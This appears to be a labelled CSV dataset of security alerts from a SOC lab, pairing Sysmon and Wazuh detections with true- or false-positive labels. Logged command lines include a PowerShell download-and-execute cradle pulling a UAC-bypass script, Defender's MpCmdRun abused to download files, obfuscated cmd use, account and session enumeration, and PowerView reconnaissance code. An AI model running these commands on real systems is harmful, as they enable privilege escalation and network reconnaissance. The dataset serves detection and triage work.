text,label,label_name
"Powershell process spawned Windows command shell instance 4 Low Powershell process spawned Windows command shell instance 92004 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c Powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"" \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:24:12.255
ProcessGuid: {ff3427f9-386c-6868-b402-000000001400}
ProcessId: 2252
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c cd \""%%ProgramData%%\\Microsoft\\Windows Defender\\platform\\4.18*\"" &amp; MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\\Atomic-license.txt \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:47:22.577
ProcessGuid: {ff3427f9-4bea-6868-f905-000000001400}
ProcessId: 1744
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c cd ""%%ProgramData%%\Microsoft\Windows Defender\platform\4.18*"" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\Atomic-license.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"File added to the system. 5 Low File added to the system. 554 ossec syscheck syscheck_entry_added syscheck_file syscheck_new_entry Win11Client File 'c:\users\snell\downloads\eicar-test.txt' added
Mode: realtime
 syscheck",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client cmd  /c echo Hello, from CMD! \""cmd.exe\"" /c %LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:27.673
ProcessGuid: {ff3427f9-26ab-6868-0602-000000001400}
ProcessId: 4800
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd  /c echo Hello, from CMD!  
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-26ab-6868-0402-000000001400}
ParentProcessId: 7572
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c %LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Powershell queried Win32_Process. Possible process discovery activity 4 Low Powershell queried Win32_Process. Possible process discovery activity 91841 windows  powershell windows_eventchannel Win11Client ""Creating Scriptblock text (39 of 51):
            Write-Warning ""[Get-WMIRegProxy] No proxy settings found for $ComputerName""
                }
            }
            catch {
                Write-Warning ""[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_""
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
<#
.SYNOPSIS

Returns the last user who logged onto the local (or a remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses remote registry to enumerate the LastLoggedOnUser registry key
for the local (or remote) machine.

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegLastLoggedOn

Returns the last user logged onto the local machine.

.EXAMPLE

Get-WMIRegLastLoggedOn -ComputerName WINDOWS1

Returns the last user logged onto WINDOWS1

.EXAMPLE

Get-DomainComputer | Get-WMIRegLastLoggedOn

Returns the last user logged onto all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.LastLoggedOnUser

A PSCustomObject containing the ComputerName and last loggedon user.
#>

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_LOCAL_MACHINE
            $HKLM = 2147483650

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            # try to open up the remote registry key to grab the last logged on user
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $LastLoggedOn
            }
            catch {
                Write-Warning ""[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled.""
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
<#
.SYNOPSIS

Returns information about RDP connections outgoing from the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to query all entries for the
""Windows Remote Desktop Connection Client"" on a machine, separated by
user and target server.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegCachedRDPConnection

Returns the RDP connection client information for the local machine.

.EXAMPLE

Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local

Returns the RDP connection client information for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegCachedRDPConnection

Returns cached RDP information for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.CachedRDPConnection

A PSCustomObject containing the ComputerName and cached RDP information.
#>

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_USERS
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        # pull out all the cached RDP connections
                        $ConnectionKeys = $Reg.EnumValues($HKU,""$UserSID\Software\Microsoft\Terminal Server Client\Default"").sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            # make sure this key is a cached connection
                            if ($Connection -match 'MRU.*') {
                                $TargetServer = $Reg.GetStringValue($HKU, ""$UserSID\Software\Microsoft\Terminal Server Client\Default"", $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $FoundConnection
                            }
                        }

                        # pull out all the cached server info with username hints
                        $ServerKeys = $Reg.EnumKey($HKU,""$UserSID\Software\Microsoft\Terminal Server Client\Servers"").sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, ""$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server"", 'UsernameHint').sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose ""[Get-WMIRegCachedRDPConnection] Error: $_""
                    }
                }
            }
            catch {
                Write-Warning ""[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_""
            }
        }
    }
}


function Get-WMIRegMountedDrive {
<#
.SYNOPSIS

Returns information about saved network mounted drives for the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to enumerate recently mounted network drives.

.PARAMETER ComputerName

Specifies the hostname to query for mounted drive information (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegMountedDrive

Returns the saved network mounted drives for the local machine.

.EXAMPLE

Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local

Returns the saved network mounted drives for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegMountedDrive

Returns the saved network mounted drives for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.RegMountedDrive

A PSCustomObject containing the ComputerName and mounted drive information.
#>

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_USERS
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, ""$UserSID\Network"")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, ""$UserSID\Network\$DriveLetter"", 'ProviderName').sValue
                            $RemotePath = $Reg.GetStringValue($HKU, ""$UserSID\Network\$DriveLetter"", 'RemotePath').sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, ""$UserSID\Network\$DriveLetter"", 'UserName').sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose ""[Get-WMIRegMountedDrive] Error: $_""
                    }
                }
            }
            catch {
                Write-Warning ""[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_""
            }
        }
    }
}


function Get-WMIProcess {
<#
.SYNOPSIS

Returns a list of processes and their owners on the local or remote machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
including the owners of the particular process.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management

ScriptBlock ID: a7aa712a-262a-46cc-9182-ebdb9a73fcc3
Path: "" WARNING Microsoft-Windows-PowerShell Microsoft-Windows-PowerShell/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c dsquery * -filter \""(objectClass=trustedDomain)\"" -attr * \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-06 10:52:36.516
ProcessGuid: {ff3427f9-5574-686a-8001-000000001600}
ProcessId: 7668
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c dsquery * -filter ""(objectClass=trustedDomain)"" -attr *
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-54be-686a-f173-470000000000}
LogonId: 0x4773F1
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-554a-686a-6001-000000001600}
ParentProcessId: 4180
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"The VSS service is shutting down due to idle timeout. 5 Low The VSS service is shutting down due to idle timeout. 60702 windows windows_application windows_eventchannel Win11Client ""The VSS service is shutting down due to idle timeout. "" INFORMATION VSS Application EventChannel",0,FP
"Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process 6 Low Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process 92218 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client System C:\\Windows\\cmd.exe NT AUTHORITY\\SYSTEM ""File created:
RuleName: -
UtcTime: 2025-07-06 13:49:19.323
ProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\cmd.exe
CreationUtcTime: 2025-07-06 13:49:19.323
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\cmd.exe  /S /D /c\"" echo services \"" \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.729
ProcessGuid: {ff3427f9-2281-6869-9b01-000000001500}
ProcessId: 1264
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\WINDOWS\system32\cmd.exe  /S /D /c"" echo services ""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client wmic  qfe get description,installedOn /format:csv \""cmd.exe\"" /c wmic qfe get description,installedOn /format:csv C:\\Windows\\System32\\wbem\\WMIC.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-06 13:57:44.383
ProcessGuid: {ff3427f9-80d8-686a-4206-000000001600}
ProcessId: 788
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: wmic  qfe get description,installedOn /format:csv
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}
LogonId: 0x23BE8D1
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD
ParentProcessGuid: {ff3427f9-80d8-686a-4006-000000001600}
ParentProcessId: 5788
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c wmic qfe get description,installedOn /format:csv
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"LDAP activity from Powershell process, possible remote system discovery 6 Low LDAP activity from Powershell process, possible remote system discovery 92103 sysmon sysmon_eid3_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Network connection detected:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-07-06 11:52:29.011
ProcessGuid: {ff3427f9-637a-686a-0b05-000000001600}
ProcessId: 4596
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SOCLAB\snell
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.14
SourceHostname: -
SourcePort: 50428
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.2.12
DestinationHostname: -
DestinationPort: 389
DestinationPortName: -"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
PAM: Multiple failed logins in a small period of time. 10 Medium PAM: Multiple failed logins in a small period of time. 5551 pam syslog authentication_failures pam Suricata Jul 07 20:29:09 Suricata sshd[2200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8 journald,1,TP
Suricata: Alert - ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response 3 Low Suricata: Alert - ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response 86601 ids suricata json Suricata /var/log/suricata/eve.json,0,FP
